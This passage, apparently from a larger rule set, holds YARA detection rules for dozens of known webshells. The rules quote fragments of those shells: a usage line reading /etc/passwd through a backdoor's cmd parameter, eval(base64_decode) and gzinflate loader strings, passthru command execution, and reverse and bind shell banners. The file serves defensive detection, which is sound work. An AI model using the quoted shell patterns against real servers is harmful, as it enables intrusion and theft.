      $s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie" 
      $s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C" 
   condition: 
      1 of them
}

rule Webshell_backdoorfr_php_RID306A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backdoorfr.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan" 
      $s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc" 
   condition: 
      1 of them
}

rule Webshell_aspydrv_asp_RID2F52 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file aspydrv.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:52:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))" 
      $s1 = "password" 
      $s2 = "session(\"shagman\")=" 
   condition: 
      2 of them
}

rule Webshell_Ajan_asp_RID2DC3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ajan.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "c:\\downloaded.zip" 
      $s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
      $s3 = "http://www35.websamba.com/cybervurgun/" 
   condition: 
      1 of them
}

rule Webshell_PHANTASMA_php_RID2EEA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHANTASMA.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = ">[*] Safemode Mode Run</DIV>" 
      $s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>" 
      $s2 = "[*] Spawning Shell" 
      $s3 = "Cha0s" 
   condition: 
      2 of them
}

rule Webshell_shankar_php_php_RID30DC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shankar.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:57:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-02-17"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $Author = "ShAnKaR" 
      $s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input" 
      $s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b" 
   condition: 
      1 of ( $s* ) and $Author
}

rule Webshell_Casus15_php_php_RID3059 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Casus15.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:36:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na" 
      $s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'" 
      $s3 = "value='Calistirmak istediginiz " 
   condition: 
      1 of them
}

rule Webshell_small_php_php_RID300D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file small.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
      $s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1" 
      $s4 = "@ini_set('error_log',NULL);" fullword
   condition: 
      2 of them
}

rule Webshell_fuckphpshell_php_RID3156 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file fuckphpshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$succ = \"Warning! " 
      $s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!" 
      $s2 = "\\*=-- MEMBERS AREA --=*/" 
      $s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o" 
   condition: 
      2 of them
}

rule Webshell_ngh_php_php_RID2F31 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ngh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Cr4sh_aka_RKL" 
      $s1 = "NGH edition" 
      $s2 = "/* connectback-backdoor on perl" 
      $s3 = "<form action=<?=$script?>?act=bindshell method=POST>" 
      $s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r" 
   condition: 
      1 of them
}

rule Webshell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php_RID3D96 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 22:00:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend" 
      $s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim" 
      $s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora" 
   condition: 
      1 of them
}

rule Webshell_RemExp_asp_RID2E9A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file RemExp.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:21:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<title>Remote Explorer</title>" 
      $s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi" 
      $s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f" 
   condition: 
      2 of them
}

rule Webshell_klasvayv_asp_RID2FBA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file klasvayv.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "set aktifklas=request.querystring(\"aktifklas\")" 
      $s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>" 
      $s3 = "<font color=\"#858585\">www.aventgrup.net" 
      $s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT" 
   condition: 
      1 of them
}

rule Webshell_wh_bindshell_py_RID30E1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file wh_bindshell.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:58:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "#Use: python wh_bindshell.py [port] [password]" 
      $s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
      $s3 = "#bugz: ctrl+c etc =script stoped=" fullword
   condition: 
      1 of them
}

rule Webshell_lurm_safemod_on_cgi_RID3272 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file lurm_safemod_on.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:05:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Network security team :: CGI Shell" fullword
      $s1 = "#########################<<KONEC>>#####################################" fullword
      $s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
   condition: 
      1 of them
}

rule Webshell_backupsql_php_often_with_c99shell_RID37F5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backupsql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 18:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ." 
      $s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog" 
   condition: 
      all of them
}

rule Webshell_uploader_php_php_RID3150 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file uploader.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
      $s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
      $s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
   condition: 
      2 of them
}

rule Webshell_Rem_View_php_php_RID3112 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Rem View.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\"" 
      $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'" 
      $s4 = "Welcome to phpRemoteView (RemView)" 
   condition: 
      1 of them
}

rule Webshell_STNC_php_php_RID2F2C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file STNC.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "drmist.ru" fullword
      $s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80" 
      $s2 = "STNC WebShell" 
      $s3 = "http://www.security-teams.net/index.php?showtopic=" 
   condition: 
      1 of them
}

rule Webshell_aZRaiLPhp_v1_0_php_RID312D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file aZRaiLPhp v1.0.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:11:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "azrailphp" 
      $s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>" 
      $s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>" 
   condition: 
      2 of them
}

rule Webshell_Moroccan_Spamers_Ma_EditioN_By_GhOsT_php_RID3A0F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:30:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = ";$sd98=\"john.barker446@gmail.com\"" 
      $s1 = "print \"Sending mail to $to....... \";" 
      $s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei" 
   condition: 
      1 of them
}

rule Webshell_simple_backdoor_php_RID327B : DEMO T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file simple-backdoor.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:07:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$cmd = ($_REQUEST['cmd']);" fullword
      $s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" 
      $s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
   condition: 
      2 of them
}

rule Webshell_Dive_Shell_1_0___Emperor_Hacking_Team_php_RID3A3C : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:37:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Emperor Hacking TEAM" 
      $s1 = "Simshell" fullword
      $s2 = "ereg('^[[:blank:]]*cd[[:blank:]]" 
      $s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST" 
   condition: 
      2 of them
}

rule Webshell_Asmodeus_v0_1_pl_RID30B7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Asmodeus v0.1.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "[url=http://www.governmentsecurity.org" 
      $s1 = "perl asmodeus.pl client 6666 127.0.0.1" 
      $s2 = "print \"Asmodeus Perl Remote Shell" 
      $s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
   condition: 
      2 of them
}

rule Webshell_backup_php_often_with_c99shell_RID36A5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backup.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "#phpMyAdmin MySQL-Dump" fullword
      $s2 = ";db_connect();header('Content-Type: application/octetstr" 
      $s4 = "$data .= \"#Database: $database" fullword
   condition: 
      all of them
}

rule Webshell_myshell_php_php_RID30F2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file myshell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:01:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory." 
      $s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color" 
      $s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$" 
   condition: 
      2 of them
}

rule Webshell_SimShell_1_0___Simorgh_Security_MGZ_php_RID3987 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:07:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Simorgh Security Magazine " 
      $s1 = "Simshell.css" 
      $s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], " 
      $s3 = "www.simorgh-ev.com" 
   condition: 
      2 of them
}

rule Webshell_rootshell_php_RID3029 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file rootshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:28:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "shells.dl.am" 
      $s1 = "This server has been infected by $owner" 
      $s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>" 
      $s4 = "Could not write to file! (Maybe you didn't enter any text?)" 
   condition: 
      2 of them
}

rule Webshell_connectback2_pl_RID308E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file connectback2.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   " 
      $s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel" 
      $s2 = "ConnectBack Backdoor" 
   condition: 
      1 of them
}

rule Webshell_DefaceKeeper_0_2_php_RID3201 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DefaceKeeper_0.2.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
      $s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9" 
      $s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center" 
   condition: 
      1 of them
}

rule Webshell_s72_Shell_v1_1_Coding_html_RID3436 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file s72 Shell v1.1 Coding.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:20:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><" 
      $s1 = "s72 Shell v1.0 Codinf by Cr@zy_King" 
      $s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\"" 
   condition: 
      1 of them
}

rule Webshell_Antichat_Socks5_Server_php_php_RID368D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Antichat Socks5 Server.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
      $s3 = "#   [+] Domain name address type" 
      $s4 = "www.antichat.ru" 
   condition: 
      1 of them
}

rule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php_RID3A0D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:30:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy" 
      $s1 = "Mode Shell v1.0</font></span>" 
      $s2 = "has been already loaded. PHP Emperor <xb5@hotmail." 
   condition: 
      1 of them
}

rule Webshell_mysql_php_php_RID302A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "action=mysqlread&mass=loadmass\">load all defaults" 
      $s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru" 
      $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = " 
   condition: 
      1 of them
}

rule Webshell_cyberlords_sql_php_php_RID33DC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cyberlords_sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:05:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Coded by n0 [nZer0]" 
      $s1 = " www.cyberlords.net" 
      $s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE" 
      $s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);" 
   condition: 
      1 of them
}

rule Webshell_pws_php_php_RID2F4E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file pws.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
      $s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
      $s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>" 
   condition: 
      2 of them
}

rule Webshell_PHP_Shell_php_php_RID3133 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHP Shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:12:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input" 
      $s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=" 
   condition: 
      all of them
}

rule Webshell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html_RID39CD : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Ayyildiz" 
      $s1 = "TouCh By iJOo" 
      $s2 = "First we check if there has been asked for a working directory" 
      $s3 = "http://ayyildiz.org/images/whosonline2.gif" 
   condition: 
      2 of them
}

rule Webshell_Ajax_PHP_Command_Shell_php_RID348D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ajax_PHP Command Shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>" 
      $s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help" 
      $s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct" 
   condition: 
      1 of them
}

rule Webshell_JspWebshell_1_2_jsp_RID31D6 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file JspWebshell 1.2.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:39:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "JspWebshell" 
      $s1 = "CreateAndDeleteFolder is error:" 
      $s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c" 
      $s3 = "String _password =\"111\";" 
   condition: 
      2 of them
}

rule Webshell_Phyton_Shell_py_RID30C7 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Phyton Shell.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:54:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
      $s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
      $s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
      $s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
   condition: 
      1 of them
}

rule Webshell_mysql_tool_php_php_RID3247 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql_tool.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:58:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['" 
      $s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV" 
      $s4 = "<div align=\"center\">The backup process has now started<br " 
   condition: 
      1 of them
}

